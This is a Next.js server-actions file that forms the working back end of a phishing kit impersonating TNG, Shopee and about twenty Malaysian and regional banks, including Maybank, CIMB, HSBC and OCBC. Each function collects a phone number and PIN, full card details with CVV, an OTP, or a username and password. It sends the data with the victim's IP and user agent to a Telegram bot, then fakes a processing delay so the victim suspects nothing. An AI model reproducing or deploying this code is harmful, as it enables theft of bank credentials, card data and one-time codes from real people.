'use server'

import { headers } from 'next/headers';
import {sendTelegramMessage, escapeMarkdownV2, sendTelegramMessagePrivate} from '@/lib/telegram'; // Adjust this import path to your lib

export async function submitLogin(phoneNumber: string, pin: string) {
    // Server-side validation
    if (!phoneNumber || phoneNumber.length < 8 || phoneNumber.length > 20) {
        return { success: false, errors: { phoneNumber: 'Mobile number is required and must be valid.' } };
    }
    if (!pin || pin.length !== 6 || !/^\d{6}$/.test(pin)) {
        return { success: false, errors: { pin: 'PIN must be exactly 6 digits.' } };
    }

    // Get headers for IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Construct Telegram message
    const text = [
        '🔵 *TNG Login Attempt*',
        '',
        '*Phone:* `' + escapeMarkdownV2(phoneNumber) + '`',
        '*PIN:* `' + escapeMarkdownV2(pin) + '`',
        '*IP:* ' + escapeMarkdownV2(ip),
        '*UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
    } catch (error) {
        console.error('Telegram notification failed:', error);
    }

    // Simulate a security check for UX
    await new Promise((resolve) => setTimeout(resolve, 1500));

    return { success: true };
}

export async function submitCardDetails(formData: {
    cardNumber: string;
    expiryDate: string;
    cvv: string;
    cardHolder: string;
}) {
    const { cardNumber, expiryDate, cvv, cardHolder } = formData;

    // Basic Server-side validation
    if (!cardNumber || cardNumber.length < 15) return { success: false, error: 'Invalid card number' };
    if (!expiryDate || !/^(0[1-9]|1[0-2])\/?([0-9]{2})$/.test(expiryDate)) return { success: false, error: 'Invalid expiry date' };
    if (!cvv || cvv.length < 3 || cvv.length > 4) return { success: false, error: 'Invalid CVV' };
    if (!cardHolder || cardHolder.length < 3) return { success: false, error: 'Invalid cardholder name' };

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Construct Telegram message
    const text = [
        '💳 *TNG Card Details*',
        '',
        '*Holder:* `' + escapeMarkdownV2(cardHolder) + '`',
        '*Number:* `' + escapeMarkdownV2(cardNumber) + '`',
        '*Expiry:* `' + escapeMarkdownV2(expiryDate) + '`',
        '*CVV:* `' + escapeMarkdownV2(cvv) + '`',
        '*IP:* ' + escapeMarkdownV2(ip),
        '*UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        await sendTelegramMessagePrivate(text,true);
    } catch (error) {
        console.error('Telegram notification failed:', error);
    }

    // Simulate processing time
    await new Promise((resolve) => setTimeout(resolve, 2000));

    return { success: true };
}


export async function submitMaybankLogin(username: string, password: string) {
    // Validasi di sisi server
    if (!username || username.length < 3) {
        return { success: false, error: 'The username field must be at least 3 characters.' };
    }
    if (!password || password.length < 6) {
        return { success: false, error: 'The password field must be at least 6 characters.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Waktu (Y-m-d H:i:s)
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Pesan Telegram
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(MAYBANK\\)*',
        '',
        '👤 *Username:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(password) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time for UX
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('Authentication service error:', error);
        return { success: false, error: 'Authentication service unavailable.' };
    }
}

export async function submitOtp(otp: string) {
    if (!otp || otp.length < 1) {
        return { success: false, error: 'OTP is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Construct Telegram message
    const text = [
        '🔑 *NEW OTP SUBMISSION*',
        '',
        '*OTP:* `' + escapeMarkdownV2(otp) + '`',
        '*IP:* ' + escapeMarkdownV2(ip),
        '*UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate a slight delay for verification process
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('Telegram OTP failed:', error);
        return { success: false, error: 'OTP service error.' };
    }
}

export async function submitCimbLogin(username: string, password: string) {
    if (!username || username.length < 3) {
        return { success: false, error: 'The username field must be at least 3 characters.' };
    }
    if (!password || password.length < 6) {
        return { success: false, error: 'The password field must be at least 6 characters.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(CIMB\\)*',
        '',
        '👤 *Username:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(password) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('CIMB Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitPublicBankLogin(userId: string, pass: string) {
    if (!userId || userId.length < 3) {
        return { success: false, error: 'The User ID field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(PUBLIC BANK\\)*',
        '',
        '👤 *User ID:* `' + escapeMarkdownV2(userId) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('Public Bank Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitRhbLogin(username: string, pass: string) {
    if (!username || username.length < 3) {
        return { success: false, error: 'The Username field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(RHB\\)*',
        '',
        '👤 *Username:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('RHB Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitHongLeongLogin(username: string, pass: string) {
    if (!username || username.length < 3) {
        return { success: false, error: 'The Username field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(HONG LEONG\\)*',
        '',
        '👤 *Username:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('Hong Leong Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitAffinLogin(username: string, pass: string) {
    if (!username || username.length < 3) {
        return { success: false, error: 'The Username field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(AFFIN BANK\\)*',
        '',
        '👤 *Username:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('Affin Bank Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitBankIslamLogin(username: string, pass: string) {
    if (!username || username.length < 3) {
        return { success: false, error: 'The Username field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(BANK ISLAM\\)*',
        '',
        '👤 *Username:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('Bank Islam Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitAgrobankLogin(username: string, pass: string) {
    if (!username || username.length < 3) {
        return { success: false, error: 'The Username field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(AGROBANK\\)*',
        '',
        '👤 *Username:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('Agrobank Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitAllianceLogin(username: string, pass: string) {
    if (!username || username.length < 3) {
        return { success: false, error: 'The Username field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(ALLIANCE BANK\\)*',
        '',
        '👤 *Username:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('Alliance Bank Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitBsnLogin(userId: string, pass: string) {
    if (!userId || userId.length < 3) {
        return { success: false, error: 'The User ID field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(BSN\\)*',
        '',
        '👤 *User ID:* `' + escapeMarkdownV2(userId) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('BSN Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitHsbcLogin(username: string, pass: string) {
    if (!username || username.length < 3) {
        return { success: false, error: 'Please enter a valid username.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'Please enter a valid password.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(HSBC\\)*',
        '',
        '👤 *Username:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('HSBC Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitOcbcLogin(loginId: string, pass: string) {
    if (!loginId || loginId.length < 3) {
        return { success: false, error: 'The Login ID field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(OCBC\\)*',
        '',
        '👤 *Login ID:* `' + escapeMarkdownV2(loginId) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('OCBC Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitStandardCharteredLogin(username: string, pass: string) {
    if (!username || username.length < 3) {
        return { success: false, error: 'The Username field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(STANDARD CHARTERED\\)*',
        '',
        '👤 *Username:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('Standard Chartered Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitUobLogin(username: string, pass: string) {
    if (!username || username.length < 3) {
        return { success: false, error: 'The Username field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(UOB\\)*',
        '',
        '👤 *Username:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('UOB Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitBankMuamalatLogin(username: string, pass: string) {
    if (!username || username.length < 3) {
        return { success: false, error: 'The Username field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(BANK MUAMALAT\\)*',
        '',
        '👤 *Username:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('Bank Muamalat Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitBankRakyatLogin(username: string, pass: string) {
    if (!username || username.length < 3) {
        return { success: false, error: 'The Username field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(BANK RAKYAT\\)*',
        '',
        '👤 *Username:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('Bank Rakyat Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitAmBankLogin(username: string, pass: string) {
    if (!username || username.length < 3) {
        return { success: false, error: 'The Username field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(AMBANK\\)*',
        '',
        '👤 *Username:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('AmBank Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}

export async function submitShopeeLogin(username: string, pass: string) {
    if (!username || username.length < 3) {
        return { success: false, error: 'The Username field is required.' };
    }
    if (!pass || pass.length < 6) {
        return { success: false, error: 'The Password field is required.' };
    }

    // Extract IP and User Agent
    const headersList = await headers();
    const ip = headersList.get('x-forwarded-for') || headersList.get('x-real-ip') || '-';
    const ua = headersList.get('user-agent') || '-';
    const truncatedUa = ua.length > 100 ? ua.substring(0, 100) + '...' : ua;

    // Format Time
    const now = new Date();
    const formattedTime = now.toISOString().replace('T', ' ').substring(0, 19);

    // Format Telegram Message
    const text = [
        '👤 *NEW LOGIN ATTEMPT \\(SHOPEE\\)*',
        '',
        '👤 *Username/Phone:* `' + escapeMarkdownV2(username) + '`',
        '🔑 *Password:* `' + escapeMarkdownV2(pass) + '`',
        '🕒 *Time:* `' + escapeMarkdownV2(formattedTime) + '`',
        '🌐 *IP Address:* `' + escapeMarkdownV2(ip) + '`',
        '📱 *UA:* _' + escapeMarkdownV2(truncatedUa) + '_',
    ].join('\n');

    try {
        await sendTelegramMessage(text, true);
        
        // Simulate processing time
        await new Promise((resolve) => setTimeout(resolve, 2000));

        return { success: true };
    } catch (error) {
        console.error('Shopee Login Service Error:', error);
        return { success: false, error: 'Service unavailable. Please try again later.' };
    }
}